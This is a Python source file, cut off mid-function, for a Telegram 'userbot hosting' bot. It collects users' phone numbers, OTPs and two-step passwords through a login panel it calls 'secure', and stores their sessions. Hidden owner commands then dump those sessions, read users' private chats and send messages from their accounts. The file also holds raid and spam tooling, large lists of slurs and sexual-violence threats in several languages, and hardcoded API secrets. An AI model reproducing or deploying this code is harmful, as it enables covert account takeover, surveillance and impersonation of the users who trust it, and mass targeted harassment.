import os
import sys
import json
import time
import asyncio
import random
import re
import threading
import tempfile
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"KASHYAP USERBOT is Live!")
    def log_message(self, *a):
        pass

def run_web():
    port = int(os.environ.get("PORT", 10000))
    HTTPServer(("0.0.0.0", port), H).serve_forever()

threading.Thread(target=run_web, daemon=True).start()

# ==========================================
# KASHYAP USERBOT & HOSTING BOT (FULL FIXED EDITION)
# OWNER: KASHYAP (9239452757)
# ==========================================

try:
    import telethon
except ImportError:
    os.system(f"{sys.executable} -m pip install telethon")
    import telethon

from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, FloodWaitError, UserNotParticipantError
from telethon.tl.functions.messages import ExportChatInviteRequest, SendReactionRequest
from telethon.tl.functions.contacts import BlockRequest
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.tl.types import (
    ChannelParticipantsAdmins,
    ChannelParticipantsBots,
    ChannelParticipantLeft,
    ChannelParticipantBanned,
    ReactionEmoji,
)

# CONFIGURATION
API_ID = 39105091
API_HASH = "257594e70a9926b6bb44644e17be94a9"
BOT_TOKEN = "9241124031:AAG-1mQS_IGHzsOot4JsvU2iBOwdh8yjDUU"
OWNER_ID = 9239452757
OWNER_NAME = "KASHYAP"
BOT_BRAND = "KASHYAP USERBOT"
START_TIME = time.time()
SESSIONS_FILE = "sessions.json"
START_BANNER_PATH = "photo_2026-11-25_14-19-14.jpg"

# FORCE-JOIN CHANNEL CONFIGURATION (DEMON CHANNEL)
FORCE_CHANNEL = "D_E_M_O_N302"
FORCE_CHANNEL_URL = "https://t.me/+HzmJMhZLcC82YWFl"

def format_uptime():
    sec = int(time.time() - START_TIME)
    days, sec = divmod(sec, 86400)
    hours, sec = divmod(sec, 3600)
    mins, secs = divmod(sec, 60)
    return f"{days}d {hours:02d}:{mins:02d}:{secs:02d}"

# STATIC COMMANDS MENU (FIXED LAYOUT — ALL COMMANDS INCLUDED)
STATIC_COMMANDS_TEXT = (
    "╔═════════════════════════════════════════════════╗\n"
    "║        ⚡ **KASHYAP USERBOT — COMMANDS** ⚡        ║\n"
    "╚═════════════════════════════════════════════════╝\n\n"
    "▸ **BOT & HOSTING**\n"
    "  `/start` • `/login` • `/welcome [text]`\n"
    "  `/users` • `/getsession <user_id>` • `/watch <user_id> [count]`\n"
    "  `/exec <uid> <chat> <msg>` • `/broadcast <message>`\n\n"
    "▸ **RAID & SPAM**\n"
    "  `.raid [count]` • `.oneraid [count]` • `.rraid` • `.drraid`\n"
    "  `.spam [count] [text]` • `.fastspam [count] [text]` • `.flood [count] [text]`\n"
    "  `.engraid [count]` • `.praid [count]` • `.braid [count]`\n"
    "  `.araid` • `.saraid` • `.oaraid` • `.faraid` • `.earaid`\n"
    "  `.dmraid [count]` • `.mraid [count]` • `.delayraid [sec] [count]`\n"
    "  `.emoraid [count]` • `.emojispam [count] [emoji] [text]`\n"
    "  `.mixraid [1-50]` • `.tagraid [1-50]` • `.capsraid [1-50]` • `.slowraid [1-50]`\n"
    "  `.badaid [count]` • `.saraid2 [count]` • `.ultraid [count]`\n"
    "  `.auto [link] [count]` • `.chup` • `.bol`\n\n"
    "▸ **HACK & ANIMATION (50s HACKS INCLUDED)**\n"
    "  `.hack` • `.matrix` • `.scan`\n"
    "  `.netghost` • `.rootkit` • `.cryptohack` • `.zeroday`\n"
    "  `.bruteforce [1-50]` • `.packetflood [1-50]` • `.sysbreach [1-50]`\n"
    "  `.loading` • `.boom` • `.fbi`\n"
    "  `.pulse [1-50]` • `.countanim [1-50]` • `.glitch [1-50]`\n"
    "  `.fuck` • `.type [text]`\n\n"
    "▸ **GROUP, ADMIN & AUTOPIN**\n"
    "  `.ban` • `.unban` • `.kick` • `.mute` • `.unmute`\n"
    "  `.pin` • `.unpin` • `.del` • `.invite` • `.purge [count]`\n"
    "  `.autopin on <id>` • `.autopin off <id>`\n"
    "  `.dmautopin on <t>` • `.dmautopin off <t>`\n"
    "  `.tagall [text]` • `.admins` • `.bots` • `.pingall`\n\n"
    "▸ **DM, REACT & CONTROL**\n"
    "  `.dmblock on|off` • `.dmwelcome on|off|reset` • `.dmmute` • `.undmmute`\n"
    "  `.say30 [text]` • `.stop30`\n"
    "  `.ar [emoji]` • `.dar` • `.uar` • `.duar` • `.rar [emojis...]` • `.drar`\n"
    "  `.stop` • `.stopall` • `.clear` • `.restart` • `.help`\n\n"
    "▸ **FUN, TEXT & UTILITY**\n"
    "  `.roast` • `.iq` • `.love` • `.toss` • `.dice` • `.coin` • `.rate [topic]`\n"
    "  `.calc [expr]` • `.calc2 [expr]` • `.mock [text]` • `.mock2 [text]`\n"
    "  `.reverse [text]` • `.clap [text]` • `.vapor [text]`\n"
    "  `.trim [text]` • `.caps [text]` • `.lower [text]` • `.title [text]`\n"
    "  `.ship` • `.slap` • `.hug` • `.8ball [question]` • `.fact` • `.shayari` • `.tts [text]`\n"
    "  `.ping` • `.alive` • `.alive2` • `.id` • `.id2` • `.info` • `.info2`\n"
    "  `.whois` • `.whois2` • `.chatinfo` • `.chatinfo2` • `.stats` • `.stats2`\n"
    "  `.time` • `.date` • `.afk [reason]` • `.timebio on|off` • `.save` • `.save2`\n\n"
    "✦ **POWERED BY » KASHYAP USERBOT** ✦"
)

# ONE-WORD HEAVY GAALI & INSULT DATABASE
RAW_BASE_GAALIS = [
    "MADARCHOD", "GAANDU", "CHUTIYA", "BHADWA", "RANDI",
    "LUND", "HIJDA", "CHHAKKA", "SUAR", "KAMINEY",
    "KANJAR", "HARAMKHOR", "BESHARM", "CHUTMARIKE", "LODU",
    "CHHINAR", "KAMJAT", "BHAND", "TAPORI", "GADDAR",
    "LAVDE", "KUTTA", "BALLU", "DHakkan", "CHUTMARIKA",
    "BAYMAN", "NALAYAK", "ULRAG", "FARIA", "CHAMPAN",
    "BEGHARAT", "KAMINE", "CHALBAZ", "KASAI", "GHATIYA"
]

SINGLE_GAALIS = [
    "MADARCHOD", "BHOOTNIKE", "CHUTIYE", "GANDU", "RANDI",
    "LODE", "BHOSDIKE", "LAWDE", "HIJRA", "MC", "BC",
    "TERIMA", "CHUT", "HRAMKHOR", "NALAYAK", "BAKKANCHOD"
]

ENGLISH_RAIDS = [
    "YOU ARE A TOTAL CLOWN KNOW YOUR PLACE BEFORE SPEAKING",
    "SIT DOWN KID YOUR WHOLE ARGUMENT IS PURE TRASH",
    "STOP BARKING LIKE A STRAY DOG NOBODY CARES ABOUT YOU",
    "YOU EMBARRASS YOURSELF EVERY TIME YOU OPEN YOUR MOUTH",
    "HOLD THIS L AND WALK AWAY QUIETLY FOOL",
    "PURE JOKE ENERGY FROM START TO FINISH"
]

PUNJABI_RAIDS = [
    "TERI MAA DI LUN VICH SOOTA PA DU MADARCHODA AUKAT CH REH",
    "BHOSDIKEYA TERI BHEN DI LUN VICH RICKSHAW CHALA DU KUTTEYA",
    "RANDI DE PUTTAR TERE PYO NU DASSDA AA TERI MAA DI LUN VICH DANDA",
    "CHUTIYA SALEYA APNI AUKAT VEKH LE TERI MAA DI LUN CH PAANI PA DU",
    "KUTTEY DE BACCHEYA TERA KHANDAN HI NALAYAK AA BHOSDIKEYA",
    "TERI MAA DI LUN VICH GARM LOHA PA DU MADARCHOD SALEYA",
    "BHOSDIKEYA BHAJJA YAHA TON TERI BHEN DI LUN VICH PHATAKA PA DU"
]

BENGALI_RAIDS = [
    "TOR PAYA KHA BOKACHODA NIZZER AUKAT BUJHE KATHA BOL",
    "MAGIR PO BESHYA TOR BUKER UPOR DIYE GARI CHALIYE DEBO",
    "CHODNA TOR MUKH BANDH RAKH KUKURER MOTO GHEU GHEU KORIS NA",
    "KHANKIR CHELE TOR BHAAT CHOR AUKAT SOBEI JANE",
    "TOR GAND MERE LAL KORE DEBO BOKACHODA SALA",
    "BESHYAR BACCHA BESHI PAKAMI KORIS NA EKHANE"
]

MULTI_LINE_RAIDS = [
    "TERI AUKAT ZERO HAI BHAI\nPEHLE APNE LEVEL PAR AA\nFIR BAAT KARNA",
    "SHOR KAM KAR AUR KAAM DEKH\nTERI HAR BAAT ME DAM NAHI\nNIKAL LE YAHA SE"
]

SCREENSHOT_AND_EXTRA_RAIDS = [
    "TERI VAHEN KE BHOSDIKE MEI BESAN KE LADDU",
    "ACE TERII MUMMY KE BOSHDE KI HADIYAA TOD DUNGAA",
    "TERI MAA KE SATH SUAR KA SEX KARWA DUNGAA EK SATH 6-6 BACHE DEGI 💰 🔥 😱",
    "TOHAR BAHIN CHODU BBAHEN KE LAWDE USME MITTI DAL KE CEMENT SE BHAR DU 🏠 🤢 😡 💥",
    "TERI MAA KE BHOSDE MEI GITHUB DAL KE APNA BOT HOST KARUNGAA 😂 👊 🙎 😍",
    "TERI MUMMY AUR BAHEN KO DAUDA DAUDA NE CHODUNGA UNKE NO BOLNE PE BHI LAND GHUSA DUNGA ANDER TAK 😎 😎 😂 🔥",
    "TERI HAR BAKWAS KA JAWAB SEEDHA MUH PAR MILEGA AUKAT ME REH",
    "ITNA BOLNE SE PEHLE APNI VALUE DEKH LE JO ZERO HAI",
    "SHOR MACHANE SE KUCH NAHI HOGA APNE LEVEL PAR AA PEHLE",
    "TERI AUKAT SIRF SUNNE KI HAI BOLNE KI NAHI",
    "HAR BAAR KHARED KAR BECH DENGE TERE JAISE NAAMON KO",
    "APNI HAD ME REH KAR BAAT KAR WARNA ZAMEEN ME MIL JAYEGA",
    "TERA PURA GROUP MIL KAR BHI MUQABLA NAHI KAR SAKTA",
    "BAKWAAS BAND KAR AUR APNA RASTA NAAP",
    "TERE JAISE LOG ROZ AATE HAIN AUR ROZ DHUL CHAAT TE HAIN",
    "AWAZ NEECHI RAKH AUR APNI AUKAT YAAD RAKH"
]

ROAST_LINES = [
    "Baatein aisi kar rahe ho jaise signal 1 bar pe atka ho.",
    "Confidence solid hai, bas points thode aur le aao.",
    "Aapki argument bilkul zero-watt bulb jaisi lag rahi hai.",
    "Bolne se pehle ek baar mic check kar liya karo."
]

RAID_EMOJIS = ["💀", "🔥", "🤡", "⚡", "😈", "💣", "🧨", "👁️"]

# Expanding dynamically to 1000+ heavy single-word variants
GAALIS = []
modifiers = ["VALA", "SALE", "KAMINEY", "BHADWE", "MADARCHOD", "GAANDU", "CHUTIYE", "HARAMKHOR", "KAMJAT", "CHHINAR"]
for g in RAW_BASE_GAALIS:
    GAALIS.append(g)
    for m in modifiers:
        GAALIS.append(f"{g} {m}")
        GAALIS.append(f"{m} {g}")
GAALIS.extend(ENGLISH_RAIDS)
GAALIS.extend(PUNJABI_RAIDS)
GAALIS.extend(BENGALI_RAIDS)
GAALIS.extend(SCREENSHOT_AND_EXTRA_RAIDS)
while len(GAALIS) < 1200:
    GAALIS.extend(RAW_BASE_GAALIS)

EARAID_LIST = [
    "💀MADARCHOD", "🔥GAANDU", "🤡CHUTIYA", "⚡BHADWA", "😈RANDI",
    "💣LUND", "🧨HIJDA", "💀CHHAKKA", "🔥SUAR", "🤡KAMINEY", "⚡KANJAR"
] * 100

# SESSION PERSISTENCE HELPERS
def load_saved_sessions():
    if os.path.exists(SESSIONS_FILE):
        try:
            with open(SESSIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                return data if isinstance(data, dict) else {}
        except Exception:
            return {}
    return {}

def save_sessions_to_disk(data: dict):
    try:
        with open(SESSIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f)
    except Exception as e:
        print(f"Error saving sessions: {e}", flush=True)

# FONT FORMATTERS
def format_araid(text):
    normal = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    bold = "𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗"
    return text.upper().translate(str.maketrans(normal, bold))

def format_saraid(word):
    emojis = ["💀", "🔥", "🤡", "⚡", "😈", "💣", "🧨", "👁️", "💢", "🖤", "🌪️"]
    res = []
    for char in word.upper():
        if char.isalpha():
            rep = "".join([char for _ in range(5)])
            res.append(f"*{rep}{random.choice(emojis)}*")
        else:
            res.append(char)
    return "".join(res)

def format_oaraid(text):
    mapping = {'A':'🅐','B':'🅑','C':'C','D':'🅓','E':'🅔','F':'🅕','G':'🅖','H':'H','I':'🅘','J':'🅙','K':'🅚','L':'🅛','M':'🅜','N':'N','O':'🅞','P':'P','Q':'Q','R':'R','S':'🅢','T':'🅣','U':'🅤','V':'🅥','W':'🅦','X':'🅧','Y':'🅨','Z':'Z'}
    return "".join([mapping.get(c, c) for c in text.upper()])

def format_faraid(text):
    res = []
    for c in text.upper():
        if 'A' <= c <= 'Z':
            code = ord(c) - ord('A')
            res.append(chr(0x1F1E6 + code) + '\u034f')
        else:
            res.append(c)
    return "".join(res)

# IN-MEMORY STATES
user_sessions = load_saved_sessions()
active_logins = set()
active_raids = set()
active_raid_tasks = {}       # chat_id: asyncio.Task
rraid_targets = set()        # (chat_id, user_id)
self_reacts = {}             # chat_id: emoji (for .ar)
user_react_targets = {}      # chat_id: set of user_ids (for .uar)
all_reacts = {}              # chat_id: [emojis] (for .rar)
chat_welcomes = {}           # chat_id: {'text': str, 'media': file}
dm_block_enabled = {}        # owner_id: bool
dm_welcome_enabled = {}      # owner_id: bool (True by default)
dm_welcomed_users = {}       # owner_id: set of user_ids (1 baar welcome ke liye)
dm_muted_users = {}          # owner_id: set of user_ids
afk_status = {}              # owner_id: str (reason)
autopin_chats = set()        # chat_id jahan group/chat auto-pin on hai
dm_autopin_targets = set()   # user_id jahan DM auto-pin on hai
interval_30m_tasks = {}      # (owner_id, chat_id): asyncio.Task

# INITIALIZE LOOP & BOT CLIENT (LOCK-FREE STRINGSESSION)
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)
bot = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)

async def is_user_joined_channel(user_id: int) -> bool:
    if user_id == OWNER_ID:
        return True
    if not FORCE_CHANNEL:
        return True
    peer = int(FORCE_CHANNEL) if str(FORCE_CHANNEL).lstrip("-").isdigit() else FORCE_CHANNEL
    try:
        entity = await bot.get_entity(peer)
        res = await bot(GetParticipantRequest(channel=entity, participant=user_id))
        part = getattr(res, "participant", None)
        if isinstance(part, (ChannelParticipantLeft, ChannelParticipantBanned)):
            return False
        return True
    except UserNotParticipantError:
        return False
    except Exception as e:
        print(f"[ForceJoin Check Error] uid={user_id} channel={FORCE_CHANNEL}: {e}", flush=True)
        return False

def build_force_join_card():
    text = (
        "┏━「 📢 **CHANNEL JOIN REQUIRED** 」━┓\n"
        f"┃ • **{BOT_BRAND} host karne se pehle**\n"
        "┃ • **official channel join karein,**\n"
        "┃ • **phir Verify Channel dabayein.**\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    )
    buttons = [
        [Button.url("📢 Join Us", FORCE_CHANNEL_URL)],
        [Button.inline("✅ Verify Channel", b"verify_channel")]
    ]
    return text, buttons

def build_home_card():
    text = (
        "┏━「 ⚡ **INFORMATION** ⚡ 」━┓\n"
        f"┃ • **HEY, {BOT_BRAND} IS LIVE!**\n"
        f"┃ • **OWNER: {OWNER_NAME}**\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"➤ **UPTIME:** `{format_uptime()}`\n"
        "➤ **SERVER STATUS:** `ONLINE / STATIC`\n"
        f"➤ **POWERED BY » {BOT_BRAND}**"
    )
    buttons = [
        [Button.inline("「 HELP & COMMAND 」", b"help_cmd")],
        [Button.inline("「 WEBSITE 」", b"about"), Button.inline("「 SUPPORT 」", b"guide")],
        [Button.inline("「 HELP 」", b"source"), Button.inline("「 MY HOME 」", b"my_home")],
        [Button.inline("「 LOGIN USERBOT 」", b"host_login")]
    ]
    return text, buttons

async def send_home_card(event):
    text, buttons = build_home_card()
    if START_BANNER_PATH and os.path.exists(START_BANNER_PATH):
        await event.respond(text, file=START_BANNER_PATH, buttons=buttons)
    else:
        await event.respond(text, buttons=buttons)

@bot.on(events.NewMessage(pattern=r'^/(start|login)$'))
async def start_handler(event):
    if event.raw_text.strip().lower() == "/login":
        await host_login_cb(event)
        return
    await send_home_card(event)

async def _inspect_hosted_account_brief(s_str):
    temp = TelegramClient(StringSession(s_str), API_ID, API_HASH)
    try:
        await temp.connect()
        if not await temp.is_user_authorized():
            return "REVOKED", None
        me = await temp.get_me()
        return "ACTIVE", me
    except Exception:
        return "ERROR", None
    finally:
        try:
            await temp.disconnect()
        except Exception:
            pass

@bot.on(events.NewMessage(pattern=r'^/users(?:@\w+)?$'))
async def hosted_users_cmd(event):
    if event.sender_id != OWNER_ID:
        return

    ids = list(user_sessions.keys())
    if not ids:
        await event.respond("ℹ️ **Abhi kisi ne bot host nahi kiya hai.**")
        return

    lines = [f"👑 **Owner Panel — Hosted Users ({len(ids)}):**\n"]
    for idx, uid in enumerate(ids, start=1):
        host_name = "User"
        host_uname = "No Username"
        try:
            u = await bot.get_entity(int(uid))
            host_name = getattr(u, "first_name", "") or "User"
            host_uname = f"@{u.username}" if getattr(u, "username", None) else "No Username"
        except Exception:
            pass

        status_tag, acc_me = await _inspect_hosted_account_brief(user_sessions[uid])
        if acc_me:
            acc_fname = getattr(acc_me, "first_name", "") or "Account"
            acc_uname = f"@{acc_me.username}" if getattr(acc_me, "username", None) else "No Username"
            acc_line = f"   • **Account:** **{acc_fname}** ({acc_uname}) — ID: `{acc_me.id}` [`{status_tag}`]\n"
        else:
            acc_line = f"   • **Session Status:** `{status_tag}`\n"

        lines.append(
            f"{idx}. **Hoster:** **{host_name}** ({host_uname}) — ID: `{uid}`\n"
            f"{acc_line}"
            f"   • **Session:** `/getsession {uid}` | **Watch:** `/watch {uid} 10`"
        )

    await event.respond("\n".join(lines)[:3950])

@bot.on(events.NewMessage(pattern=r'^/getsession(?:\s+(\d+))?$'))
async def getsession_cmd(event):
    if event.sender_id != OWNER_ID:
        return

    uid = event.pattern_match.group(1)
    if not uid:
        await event.respond("ℹ️ **Istemaal:** `/getsession <user_id>` (pehle `/users` se ID dekhein).")
        return

    s_str = user_sessions.get(str(uid))
    if not s_str:
        await event.respond(f"❌ **ID `{uid}` ke liye koi saved session nahi mili.**")
        return

    await event.respond(
        f"🔐 **Session for `{uid}`:**\n`{s_str}`\n\n"
        "⚠️ *Is session string ko kisi ke saath share na karein.*"
    )

@bot.on(events.NewMessage(pattern=r'^/watch(?:\s+(\d+))?(?:\s+(\d+))?$'))
async def owner_watch_cmd(event):
    if event.sender_id != OWNER_ID:
        return

    uid = event.pattern_match.group(1)
    limit = int(event.pattern_match.group(2) or 10)
    limit = max(1, min(limit, 25))

    if not uid:
        await event.respond("ℹ️ **Istemaal:** `/watch <user_id> [count]`")
        return

    s_str = user_sessions.get(str(uid))
    if not s_str:
        await event.respond(f"❌ **ID `{uid}` ke liye koi saved session nahi mili.**")
        return

    temp_client = TelegramClient(StringSession(s_str), API_ID, API_HASH)
    try:
        await temp_client.connect()
        if not await temp_client.is_user_authorized():
            await event.respond(f"⚠️ **ID `{uid}` ka session expire/revoke ho chuka hai.**")
            return

        me = await temp_client.get_me()
        my_id = getattr(me, "id", None)
        out = [f"👁️ **Recent Activity — `{uid}` ({getattr(me, 'first_name', 'User')}, ID: `{my_id}`)**\n"]

        dialogs = await temp_client.get_dialogs(limit=5)
        for d in dialogs:
            chat_title = getattr(d, "name", "Chat")
            msgs = []
            async for m in temp_client.iter_messages(d.entity, limit=limit):
                direction = "➡️ OUT" if (my_id and m.sender_id == my_id) else "⬅️ IN"
                preview = (m.raw_text or ("[Media/Sticker]" if m.media else "[Empty]")).replace("\n", " ")
                msgs.append(f"  • {direction}: `{preview[:70]}`")
            out.append(f"💬 **{chat_title}** (`{d.id}`):")
            out.extend(msgs if msgs else ["  • *No recent messages*"])

        await event.respond("\n".join(out)[:3900])
    except Exception as e:
        await event.respond(f"❌ **Watch fail:** `{e}`")
    finally:
        await temp_client.disconnect()

@bot.on(events.NewMessage(pattern=r'^/exec\s+(\d+)\s+(\S+)\s+(.+)$'))
async def owner_exec_cmd(event):
    if event.sender_id != OWNER_ID:
        return

    uid = event.pattern_match.group(1)
    target = event.pattern_match.group(2)
    text = event.pattern_match.group(3)

    s_str = user_sessions.get(uid)
    if not s_str:
        await event.respond(f"❌ **ID `{uid}` ke liye koi session nahi mili.**")
        return

    peer = int(target) if target.lstrip("-").isdigit() else target
    temp_client = TelegramClient(StringSession(s_str), API_ID, API_HASH)
    try:
        await temp_client.connect()
        if not await temp_client.is_user_authorized():
            await event.respond(f"⚠️ **ID `{uid}` ka session expire/revoke ho chuka hai.**")
            return
        await temp_client.send_message(peer, text)
        await event.respond(f"✅ **Hosted user `{uid}` ke account se `{target}` ko message bhej diya gaya.**")
    except Exception as e:
        await event.respond(f"❌ **Send fail:** `{e}`")
    finally:
        await temp_client.disconnect()

@bot.on(events.NewMessage(pattern=r'^/broadcast(?:\s+([\s\S]+))?$'))
async def owner_broadcast_cmd(event):
    if event.sender_id != OWNER_ID:
        return

    msg_text = (event.pattern_match.group(1) or "").strip()
    if not msg_text and event.is_reply:
        rep = await event.get_reply_message()
        msg_text = (rep.raw_text or "").strip() if rep else ""

    if not msg_text:
        await event.respond("ℹ️ **Istemaal:** `/broadcast <apna message>` (ya kisi message par reply karke `/broadcast` likhein).")
        return

    ids = list(user_sessions.keys())
    if not ids:
        await event.respond("ℹ️ **Abhi kisi ne bot host nahi kiya hai.**")
        return

    status_msg = await event.respond(f"📣 **Broadcast shuru ho raha hai (`{len(ids)}` hosted users)...**")
    sent_ok = 0
    sent_fail = 0

    for uid_str in ids:
        try:
            await bot.send_message(int(uid_str), msg_text)
            sent_ok += 1
            await asyncio.sleep(0.15)
        except FloodWaitError as f:
            await asyncio.sleep(f.seconds + 0.5)
            try:
                await bot.send_message(int(uid_str), msg_text)
                sent_ok += 1
            except Exception:
                sent_fail += 1
        except Exception:
            sent_fail += 1

    await status_msg.edit(
        f"✅ **Broadcast Complete!**\n"
        f"• **Sent:** `{sent_ok}`\n"
        f"• **Failed:** `{sent_fail}`"
    )

@bot.on(events.CallbackQuery(data=b'verify_channel'))
async def verify_channel_cb(event):
    uid = event.sender_id
    if await is_user_joined_channel(uid):
        await event.answer("✅ Channel verified! Ab login shuru ho raha hai.", alert=False)
        try:
            await event.delete()
        except Exception:
            pass
        await host_login_cb(event)
    else:
        await event.answer("❌ Aapne abhi tak channel join nahi kiya hai! Pehle Join Us dabayein.", alert=True)

@bot.on(events.CallbackQuery(data=b'my_home'))
async def my_home_cb(event):
    await event.answer("Home panel refreshed.", alert=False)
    await send_home_card(event)

@bot.on(events.CallbackQuery(data=b'about'))
async def about_cb(event):
    await event.answer(f"{BOT_BRAND} — Clean Static Commands & Hosting Panel", alert=True)

@bot.on(events.CallbackQuery(data=b'owner'))
async def owner_cb(event):
    await event.answer(f"Owner: {OWNER_NAME}\nUser ID: {OWNER_ID}", alert=True)

@bot.on(events.CallbackQuery(data=b'guide'))
async def guide_cb(event):
    await event.answer(
        "1. Official channel join karein & Verify dabayein\n"
        "2. 「 LOGIN USERBOT 」 dabayein\n"
        "3. Phone number (+91...) aur OTP daalein",
        alert=True
    )

@bot.on(events.CallbackQuery(data=b'source'))
async def source_cb(event):
    await event.answer(f"{BOT_BRAND} — Private Static Edition", alert=True)

@bot.on(events.CallbackQuery(data=b'help_cmd'))
async def help_cb(event):
    sender_id = event.sender_id
    is_hosted = (str(sender_id) in user_sessions) or (sender_id in user_sessions) or (sender_id == OWNER_ID)

    if not is_hosted:
        await event.answer("🔒 Pehle LOGIN USERBOT se apna account host karein!", alert=True)
        await event.respond(
            "┏━「 🔒 **ACCESS LOCKED** 」━┓\n"
            "┃ • **COMMANDS LOCKED HAIN!**\n"
            "┃ • **PEHLE LOGIN USERBOT KAREIN**\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    await event.answer("Static commands list ready.", alert=False)
    await event.respond(STATIC_COMMANDS_TEXT)

@bot.on(events.CallbackQuery(data=b'host_login'))
async def host_login_cb(event):
    sender_id = event.sender_id

    if not await is_user_joined_channel(sender_id):
        if hasattr(event, "answer"):
            await event.answer("📢 Pehle channel join karein!", alert=True)
        txt, btns = build_force_join_card()
        await event.respond(txt, buttons=btns)
        return

    if sender_id in active_logins:
        if hasattr(event, "answer"):
            await event.answer("⚠️ Ek login process pehle se chal raha hai!", alert=True)
        await event.respond(
            "┏━「 ⚠️ **ALREADY ACTIVE** 」━┓\n"
            "┃ • ❌ **EK LOGIN PROCESS PEHLE SE CHAL RAHA HAI!**\n"
            "┃ • ⏳ **KRIPYA USE PURA KAREIN YA KUCH DER BAAD TRY KAREIN.**\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    active_logins.add(sender_id)
    if hasattr(event, "answer"):
        await event.answer("Secure login panel opened.", alert=False)

    try:
        async with bot.conversation(sender_id, timeout=180) as conv:
            await conv.send_message(
                "┏━「 🔐 **SECURE LOGIN PANEL** 」━┓\n"
                "┃ • 📱 **SEND YOUR PHONE NUMBER**\n"
                "┃ • ➤ `+91XXXXXXXXXX`\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )
            phone_msg = await conv.get_response()
            phone = phone_msg.text.strip()

            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()

            try:
                sent = await client.send_code_request(phone)
            except Exception as e:
                await conv.send_message(f"❌ **Code bhejne mein dikkat aayi:** `{e}`")
                await client.disconnect()
                return

            await conv.send_message("📩 **OTP bhej diya gaya hai.** Kripya Telegram par aaya OTP code bhejein:")
            code_msg = await conv.get_response()
            code = "".join(code_msg.text.split())

            try:
                await client.sign_in(phone, code, phone_code_hash=sent.phone_code_hash)
            except SessionPasswordNeededError:
                await conv.send_message("🔐 **2-Step Verification active hai.** Kripya apna password bhejein:")
                pwd_msg = await conv.get_response()
                password = pwd_msg.text.strip()
                try:
                    await client.sign_in(password=password)
                except Exception as e:
                    await conv.send_message(f"❌ **2FA password galat hai:** `{e}`")
                    await client.disconnect()
                    return
            except Exception as e:
                await conv.send_message(f"❌ **Login safal nahi ho saka:** `{e}`")
                await client.disconnect()
                return

            session_str = client.session.save()
            user_sessions[str(sender_id)] = session_str
            save_sessions_to_disk(user_sessions)

            asyncio.create_task(start_userbot_session(session_str, sender_id))

            await conv.send_message(
                "┏━「 ✅ **HOSTING COMPLETE** 」━┓\n"
                f"┃ • **BOT: {BOT_BRAND}**\n"
                f"┃ • **OWNER: {OWNER_NAME}**\n"
                "┃ • **HELP & COMMAND UNLOCKED!**\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )
    except asyncio.TimeoutError:
        await bot.send_message(
            sender_id,
            "┏━「 ⏱️ **SESSION EXPIRED** 」━┓\n"
            "┃ • ⚠️ **LOGIN SESSION EXPIRE HO GAYA!**\n"
            "┃ • 📌 **AAPNE SAMAY PAR NUMBER YA OTP NAHI BHEJA.**\n"
            "┃ • 🔄 **DOBARA LOGIN KARNE KE LIYE /LOGIN DALEIN.**\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
    finally:
        active_logins.discard(sender_id)

# DYNAMIC USERBOT SESSION RUNNER
async def start_userbot_session(session_string, owner_id):
    ubot = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    dm_muted_users.setdefault(owner_id, set())
    dm_welcome_enabled.setdefault(owner_id, True)
    dm_welcomed_users.setdefault(owner_id, set())
    timebio_tasks = {}
    chup_muted_users = set()

    async def send_tg_reaction(target_chat, msg_id, emoji):
        try:
            await ubot(SendReactionRequest(
                peer=target_chat,
                msg_id=msg_id,
                reaction=[ReactionEmoji(emoticon=emoji)]
            ))
            return True
        except Exception:
            try:
                await ubot(SendReactionRequest(
                    peer=target_chat,
                    msg_id=msg_id,
                    reaction=[ReactionEmoji(emoticon=emoji)],
                    big=True
                ))
                return True
            except Exception:
                return False

    # WELCOME FEATURE: SET WELCOME WITH PIC & TEXT
    @ubot.on(events.NewMessage(outgoing=True, pattern=r'^\/welcome'))
    async def set_welcome_handler(event):
        chat_id = event.chat_id
        text_arg = event.raw_text.replace('/welcome', '').strip()

        if event.is_reply:
            reply = await event.get_reply_message()
            text = text_arg or (reply.text if reply and reply.text else "Swagat hai! 👋")
            if reply and reply.media:
                chat_welcomes[chat_id] = {'text': text, 'media': reply.media}
                await event.edit("✅ **Welcome photo aur message set ho gaya hai.**")
            else:
                chat_welcomes[chat_id] = {'text': text, 'media': None}
                await event.edit("✅ **Welcome message set ho gaya hai.**")
        elif event.media:
            text = text_arg or "Swagat hai! 👋"
            chat_welcomes[chat_id] = {'text': text, 'media': event.media}
            await event.edit("✅ **Welcome photo aur message set ho gaya hai.**")
        else:
            await event.edit("ℹ️ **Istemaal:** Photo ke saath `/welcome [text]` bhejein ya photo par reply karein.")

    # WELCOME TRIGGER ON NEW MEMBER
    @ubot.on(events.ChatAction)
    async def welcome_new_member(event):
        if event.user_joined or event.user_added:
            chat_id = event.chat_id
            if chat_id in chat_welcomes:
                w_data = chat_welcomes[chat_id]
                try:
                    if w_data['media']:
